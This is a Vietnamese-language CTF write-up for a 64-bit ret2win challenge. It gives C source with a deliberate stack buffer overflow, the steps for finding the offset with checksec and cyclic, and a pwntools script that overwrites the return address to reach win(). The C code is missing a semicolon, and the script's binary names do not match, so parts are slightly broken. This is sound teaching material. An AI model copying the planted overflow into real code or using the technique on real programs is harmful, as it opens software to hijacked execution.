# ret2win_chall_demo_file

## ret2win.c
```C
#include <stdio.h>
#include <string.h>
void win() {
    printf("\nWELL DONE! THIS IS YOUR FLAG: CTF{ISP_VO_DICH}\n");
}
void vulnerable() {
    char buffer[32];
    printf("Enter input: ");
   fgets(buffer, 100, stdin)
}
int main() {
    setbuf(stdout, NULL);
    printf("=== 64-bit RET2WIN CHALLENGE ===\n");
    vulnerable();
    printf("Try again!\n");
    return 0;
}
```

## Lỗ hổng nằm trong hàm `vulnerable`:
- Khai báo mảng `buffer` có kích thước 32 byte.
- Sử dụng hàm `fgets` để đọc dữ liệu từ người dùng, với tham số thứ hai là 100, nghĩa là sẽ đọc tối đa 100 byte (bao gồm cả ký tự null) vào `buffer`.
- Vấn đề: `buffer` chỉ có 32 byte, nhưng `fgets` cho phép đọc đến 100 byte. Điều này dẫn đến tràn bộ đệm (buffer overflow) nếu người dùng nhập nhiều hơn 31 ký tự.
- Hậu quả: Dữ liệu nhập vào vượt quá 32 byte sẽ ghi đè lên các vùng nhớ khác trên stack, bao gồm cả địa chỉ trở về (return address) của hàm `vulnerable`. Khi hàm `vulnerable` kết thúc, nó sẽ trả về địa chỉ mà chúng ta đã ghi đè, từ đó cho phép điều khiển luồng thực thi của chương trình.





## Kiểm tra bảo mật 
### Cài pwntools
```bash
pip install pwntools
```
### checksec file
```bash
checksec chall1
```

 **Mục đích: phân tích cơ chế bảo mật của file thực thi:**
- NX (No-execute): Ngăn chặn thực thi code trên stack
- Stack Canary: Phát hiện tràn bộ đệm
- PIE (Position Independent Executable): Random hóa địa chỉ → Cần tắt để sử dụng địa chỉ cố định

→ ret2win chỉ khả thi khi không có Stack Canary và PIE tắt.



## Tạo pattern 100 kí tự
```bash
cyclic 100
```
**Mục đích:**
- Tạo chuỗi nhập mẫu có cấu trúc đặc biệt (vd: aaaabaaacaaad...). Khi chương trình crash, giá trị RIP sẽ trỏ vào 1 phần của chuỗi này, giúp tính toán offset chính xác.


## Khi chương trình crash, kiểm tra giá trị RIP:
```bash
info registers rip
```
**Mục đích:**
- Lấy giá trị thanh ghi RIP (Instruction Pointer) khi crash. Ví dụ: 0x6161616161616166


## Tìm offset từ giá trị RIP:
```bash
cyclic -l <giá_trị_rip>
```
**Mục đích:**
- Xác định chính xác số byte cần nhập để ghi đè lên RIP.
Ví dụ: Output 40 → Cần 40 byte để kiểm soát RIP.

## Tìm địa chỉ hàm win
```bash
p & win
```


## Viết script (solve1.py)
```python
from pwn import *
exe = ELF("./chall1", checksec = False)
p = process('./chall_ret2win')

offset = 40                    #Độ dài offset

payload = b'A' * offset        #Tạo input gây BOF
payload += p64(exe.sym['win'])       #Ghi đè địa chỉ hàm win lên return address

p.sendline(payload)
p.interactive()
```
**Giải thích chi tiết:**

- b'A' * offset: Điền đầy buffer + padding → Chạm tới vị trí RIP

- p64(exe.sym['win']): Ghi đè RIP bằng địa chỉ hàm win() (đóng gói dạng 64-bit little-endian)

- Khi hàm vulnerable() return, thay vì quay về main(), nó nhảy vào win() → In flag


## Chạy script
```bash
  python3 solve1.py
```
**Kết quả khi thành công:**
```
WELL DONE! THIS IS YOUR FLAG: CTF{ISP_VO_DICH}
```
